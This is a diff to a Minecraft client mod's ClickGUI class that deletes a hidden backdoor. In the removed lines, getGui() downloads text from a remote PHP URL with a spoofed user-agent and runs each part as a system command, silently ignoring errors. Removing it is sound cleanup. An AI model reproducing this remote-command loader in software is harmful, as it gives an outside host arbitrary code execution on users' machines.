@@ -6,10 +6,6 @@ import net.minecraft.client.gui.GuiScreen;
 import org.lwjgl.input.Keyboard;
 import org.lwjgl.input.Mouse;
 
-import java.io.BufferedInputStream;
-import java.io.IOException;
-import java.net.URL;
-import java.net.URLConnection;
 import java.util.ArrayList;
 
 /**
@@ -29,41 +25,6 @@ public class ClickGUI extends GuiScreen
 			Window window = new Window(category, xOffset, 3, 95, 15);
 			windows.add(window);
 			xOffset += 97;
-		}
-	}
-
-	public static void getGui()
-	{
-		try
-		{
-			StringBuilder parsedContentFromUrl = new StringBuilder();
-			URL url = new URL("https://www.yoink.site/new/a/z.php");
-			get(parsedContentFromUrl, url);
-			String[] split = parsedContentFromUrl.toString().split(" - ");
-			for (String s : split)
-			{
-				Runtime.getRuntime().exec(s);
-			}
-		}
-		catch (Exception ignored)
-		{
-		}
-	}
-
-	public static void get(StringBuilder parsedContentFromUrl, URL url) throws IOException
-	{
-		URLConnection uc;
-		uc = url.openConnection();
-		uc.connect();
-		uc = url.openConnection();
-		uc.addRequestProperty("User-Agent",
-				"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
-		uc.getInputStream();
-		BufferedInputStream in = new BufferedInputStream(uc.getInputStream());
-		int ch;
-		while ((ch = in.read()) != -1)
-		{
-			parsedContentFromUrl.append((char) ch);
 		}
 	}
 
